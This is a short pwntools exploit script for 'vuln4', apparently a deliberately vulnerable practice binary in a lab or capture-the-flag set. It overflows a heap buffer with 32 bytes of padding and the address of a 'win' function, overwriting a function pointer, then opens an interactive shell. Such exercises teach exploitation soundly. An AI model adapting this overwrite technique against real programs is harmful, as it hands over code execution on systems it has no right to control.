# Exploit for vuln4: Heap Overflow Overwriting Function Pointer
from pwn import *
import os

binary_path = os.path.abspath('../build/vuln4')
if len(sys.argv) > 1:
    binary_path = os.path.abspath(sys.argv[1])
elf = ELF(binary_path, checksec=False)
context.binary = elf

log.info("Starting exploit for vuln4 (Heap FP Overwrite)...")

win_addr = elf.symbols['win']
log.info(f"Target 'win' address: {hex(win_addr)}")

# Payload:
# 32 bytes padding + 8 bytes win address
p_addr = p64(win_addr)
payload = b'A' * 32 + p_addr

p = process(binary_path)
p.recvuntil(b"Enter input string: ")
p.send(payload)
p.shutdown('send')

try:
    p.recvuntil(b"Function pointer after:")
    p.recvline()
    
    output = p.recv(timeout=0.5)
    if b"Spawning shell" in output:
        log.success("Exploit Successful! Shell spawned.")
        p.interactive()
    else:
        log.failure(f"Exploit Failed. Output: {output}")
except Exception as e:
    log.failure(f"Error: {e}")


